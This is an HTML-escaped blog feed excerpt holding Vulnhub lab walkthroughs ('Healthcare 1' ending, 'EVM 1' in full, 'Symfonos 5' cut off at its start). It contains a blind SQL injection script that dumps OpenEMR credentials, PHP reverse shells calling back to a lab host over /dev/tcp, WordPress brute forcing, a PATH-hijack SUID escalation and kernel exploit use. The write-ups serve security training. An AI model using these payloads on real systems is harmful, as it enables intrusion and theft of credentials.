    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,length&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; char &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; all:
            payload &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%2b(SELECT+if(ascii(substr((select+group_concat(username,&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;,password)+from+users+limit+0,1),&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; str(i)&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;,1))=&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;str(ord(char))&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;,sleep(3),1))%2b&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;
            &lt;span style=&#34;color:#75715e&#34;&gt;#print(payload)&lt;/span&gt;
            r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; requests&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(url&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;payload)
            &lt;span style=&#34;color:#75715e&#34;&gt;#print(r.request.url)&lt;/span&gt;
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; r&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;elapsed&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;total_seconds() &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;:
                output&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(char)
                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; char &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;,&amp;#34;&lt;/span&gt;:
                    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)
                    &lt;span style=&#34;color:#66d9ef&#34;&gt;continue&lt;/span&gt;
                &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(char, end&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;, flush&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;True)


&lt;span style=&#34;color:#66d9ef&#34;&gt;try&lt;/span&gt;:
    extract_users()
&lt;span style=&#34;color:#66d9ef&#34;&gt;except&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;KeyboardInterrupt&lt;/span&gt;:
    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;print&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Exiting...&amp;#34;&lt;/span&gt;)
    sys&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;exit()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;After running the script, we get the hashes of 2 users.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-5.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;pre&gt;&lt;code&gt;admin : 3863efef9ee2bfbc51ecdca359c6302bed1389e8
medical : ab24aed5a7c4ad45615cd7e0da816eea39e4895d
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We can try crack these hashes using hashcat/john the ripper but using crackstation.net would be quicker.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-6.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Now we have passwords for both users.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;admin : ackbar
medical : medical
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&#34;shell-as-apache&#34;&gt;Shell as apache&lt;/h1&gt;
&lt;p&gt;With this credentials, let&amp;rsquo;s get back to ftp. Only the credentials for medical user work.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-7.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;On ftp we see that we have access to the file system as the medical user, and we can even access
the web server directory.&lt;/p&gt;
&lt;p&gt;Due to the permissions set we can only write to openemr directory. With this, we can upload a php file that will provide
a reverse shell.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-8.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Contents of revshell.php:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;system&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/bash -c &amp;#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.56.1/9000 0&amp;gt;&amp;amp;1 &amp;amp;&amp;#39;&amp;#34;&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Making a request to the uploaded file using curl, we get the reverse shell.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-9.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;After spawning a proper tty shell with python, we can switch to the medical user. In the Documents folder there&amp;rsquo;s a
Passwords.txt but the root creds don&amp;rsquo;t work.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-10.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;shell-as-root&#34;&gt;Shell as root&lt;/h1&gt;
&lt;p&gt;Checking for usual privesc techniques like suid binaries by using find command we get one unusual binary.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;find / -perm -4000 -ls 2&amp;gt;/dev/null
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-11.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;After running healthcheck, it outputs some system information like disks.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-12.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;To understand what exactly it&amp;rsquo;s doing, we run strings on this binary. From this we identify ways to abuse this since
it doesn&amp;rsquo;t use absolute paths on the commands it runs, therefore it will use what it finds from our PATH variable.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-13.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;I&amp;rsquo;ll use ifconfig here with my own code and place it in the /tmp folder and update my PATH variable. When this ifconfig
is executed it will created a copy of the bash binary which has suid permissions.&lt;/p&gt;
&lt;p&gt;Contents of ifconfig:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#!/bin/sh
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;cp /bin/bash /tmp/suidbash;chmod u+s /tmp/suidbash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-14.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;We can then run the suidbash binary with -p to preserve the privileges and get root privileges and read the final
root.txt.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-15.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;After getting root I found I has skipped over user.txt in almirant&amp;rsquo;s home directory&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-16.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;extras&#34;&gt;Extras&lt;/h1&gt;
&lt;p&gt;After looking at other writeups, I discovered other possible paths for exploiting this
machine.&lt;/p&gt;
&lt;p&gt;Initial step needed was exploiting the sql injection. Using sqlmap would have been a quicker way
and achieved the same results. I intentionally didn&amp;rsquo;t use sqlmap on my initial exploitation.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;sqlmap -u &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;http://192.168.56.106/openemr/interface/login/validateUser.php?u=&amp;#34;&lt;/span&gt; --batch --dump -T users -C username,password
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-25.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Using the obtained credentials, we can login to openemr as administrator and we can either upload a php file or
edit existing php files for command execution.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;h4 id=&#34;file-upload&#34;&gt;File upload&lt;/h4&gt;
&lt;/li&gt;
&lt;/ul&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-17.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;The file upload functionality does not have restrictions, therefore we can upload our php reverse shell and it will
be stored in that images directory.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-18.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;We can the trigger the reverse shell by visiting the revshell.php in the /openemr/sites/default/images/ directory.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-19.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Reverse shell obtained.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-20.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;ul&gt;
&lt;li&gt;
&lt;h4 id=&#34;edit-existing-php-files&#34;&gt;Edit existing php files&lt;/h4&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Using the same files functionality, we can also perform edits to existing files. In this case we can edit config.php
and add our reverse shell payload. After saving it and refreshing the page, a reverse shell is obtained on netcat
listener.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-24.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Another possible path that would have been taken after initial shell was that, the shadow file in the
/var/backups directory was world readable.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-21.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Therefore we can crack this hash and switch user to almirant.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-22.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Then we get user.txt.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/healthcare1/healthcare-23.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;</content>
    </item>
    
    <item>
      <title>Vulnhub: EVM 1</title>
      <link>https://blog.ikuamike.io/posts/2021/evm/</link>
      <pubDate>Fri, 05 Mar 2021 00:00:00 +0000</pubDate>
      
      <guid>https://blog.ikuamike.io/posts/2021/evm/</guid>
      <description></description>
      <content>&lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Difficulty&lt;/th&gt;
&lt;th&gt;Release Date&lt;/th&gt;
&lt;th&gt;Author&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;Beginner&lt;/td&gt;
&lt;td&gt;2 Nov 2019&lt;/td&gt;
&lt;td&gt;Ic0de&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h1 id=&#34;summary&#34;&gt;Summary&lt;/h1&gt;
&lt;p&gt;This was an easy box, initial foothold was on wordpress. You needed to bruteforce the admin creds
then get a reverse shell via editing a theme file to get the reverse shell. Escalating to root
was straightforward as we found the root password in a txt file. Some kernel exploits could have also
been used for privilege escalation.&lt;/p&gt;
&lt;h1 id=&#34;reconnaissance&#34;&gt;Reconnaissance&lt;/h1&gt;
&lt;p&gt;Nmap&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;Nmap scan report &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 192.168.56.103
Host is up &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;0.00028s latency&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;.

PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux; protocol 2.0&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| ssh-hostkey:
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; a2:d3:34:13:62:b1:18:a3:dd:db:35:c5:5a:b7:c0:78 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;RSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|   &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 85:48:53:2a:50:c5:a0:b7:1a:ee:a4:d8:12:8e:1c:ce &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ECDSA&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_  &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; 36:22:92:c7:32:22:e3:34:51:bc:0e:74:9f:1c:db:aa &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;ED25519&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
53/tcp  open  domain      ISC BIND 9.10.3-P4 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu Linux&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| dns-nsid:
|_  bind.version: 9.10.3-P4-Ubuntu
80/tcp  open  http        Apache httpd 2.4.18 &lt;span style=&#34;color:#f92672&#34;&gt;((&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;))&lt;/span&gt;
|_http-server-header: Apache/2.4.18 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|_http-title: Apache2 Ubuntu Default Page: It works
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: CAPA RESP-CODES SASL AUTH-RESP-CODE TOP UIDL PIPELINING
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: more post-login LOGINDISABLEDA0001 ID LOGIN-REFERRALS listed IMAP4rev1 have capabilities OK ENABLE Pre-login LITERAL+ SASL-IR IDLE
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;workgroup: WORKGROUP&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
Service Info: Host: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: -1s
|_nbstat: NetBIOS name: UBUNTU-EXTERMEL, NetBIOS user: &amp;lt;unknown&amp;gt;, NetBIOS MAC: &amp;lt;unknown&amp;gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;unknown&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| smb-os-discovery:
|   OS: Windows 6.1 &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Samba 4.3.11-Ubuntu&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
|   Computer name: ubuntu-extermely-vulnerable-m4ch1ine
|   NetBIOS computer name: UBUNTU-EXTERMELY-VULNERABLE-M4CH1INE&lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt;
|   Domain name: &lt;span style=&#34;color:#ae81ff&#34;&gt;\x&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;00&lt;/span&gt;
|   FQDN: ubuntu-extermely-vulnerable-m4ch1ine
|_  System time: 2021-03-04T15:43:32-05:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;dangerous, but default&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-03-04T20:43:32
|_  start_date: N/A
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h1 id=&#34;enumeration&#34;&gt;Enumeration&lt;/h1&gt;
&lt;h2 id=&#34;samba-139445&#34;&gt;Samba (139,445)&lt;/h2&gt;
&lt;p&gt;Running smbmap and smbclient there&amp;rsquo;s not much there.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;smbmap -R -H 192.168.56.103

smbclient -L &lt;span style=&#34;color:#ae81ff&#34;&gt;\\&lt;/span&gt;192.168.56.103 -N
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm1.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;From enum4linux-ng we only get a username&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;enum4linux-ng -A -R 192.168.56.103
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm2.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h2 id=&#34;http-80&#34;&gt;HTTP (80)&lt;/h2&gt;
&lt;p&gt;Visiting the ip on the browser there&amp;rsquo;s only the apache default page.&lt;/p&gt;
&lt;p&gt;Running directory bruteforce, we discover wordpress.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm3.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Wordpress:&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm4.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Some of the comments hint towards bruteforcing credentials.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm5.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Bruteforcing the login page on wordpress we get the password &lt;code&gt;24992499&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;wpscan --url http://192.168.56.103/wordpress/ -U c0rrupt3d_brain -P /usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt -t &lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm7.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;shell-as-www-data&#34;&gt;Shell as www-data&lt;/h1&gt;
&lt;p&gt;With admin access we can edit one of the wordpress theme files to get a reverse shell with this php payload.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;exec&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/bin/bash -c &amp;#39;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.56.1/9000 0&amp;gt;&amp;amp;1 &amp;amp;&amp;#39;&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm6.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Loading the following url we get a reverse shell.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/404.php
&lt;/code&gt;&lt;/pre&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm8.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Changing directory to /home there&amp;rsquo;s one user&amp;rsquo;s folder. Looking at all the files in this directory there&amp;rsquo;s a hidden
file with the root user&amp;rsquo;s password.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm9.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;shell-as-root&#34;&gt;Shell as root&lt;/h1&gt;
&lt;p&gt;Using the password &lt;code&gt;willy26&lt;/code&gt; I switched to the root user.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm10.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;h1 id=&#34;extras&#34;&gt;Extras&lt;/h1&gt;
&lt;p&gt;Privilege escalation could have also been achieved via kernel exploit.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm11.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;The box is running ubuntu 16.04.3 and kernel version 4.4.0-87. Searching for exploits using searchsploit
we get several hits.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm12.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;Getting the first local privilege escalation script and transferring the compiled binary to the target, it works.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;searchsploit -m &lt;span style=&#34;color:#ae81ff&#34;&gt;45010&lt;/span&gt;

gcc 45010.c -o pwn
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm13.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;p&gt;The second one &lt;code&gt;44298&lt;/code&gt; also works.&lt;/p&gt;

  &lt;img src=&#34;https://blog.ikuamike.io/img/evm/evm14.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;</content>
    </item>
    
    <item>
      <title>Vulnhub: Symfonos 5</title>
      <link>https://blog.ikuamike.io/posts/2021/symfonos5/</link>
      <pubDate>Wed, 17 Feb 2021 21:54:20 +0300</pubDate>
      
      <guid>https://blog.ikuamike.io/posts/2021/symfonos5/</guid>
      <description></description>
      <content>&lt;img src=&#34;https://blog.ikuamike.io/img/symfonos1/symfonos1.png&#34;  alt=&#34;symfonos&#34;  class=&#34;center&#34;  style=&#34;border-radius: 8px;&#34;  /&gt;


&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Difficulty&lt;/th&gt;
&lt;th&gt;Release Date&lt;/th&gt;
&lt;th&gt;Author&lt;/th&gt;
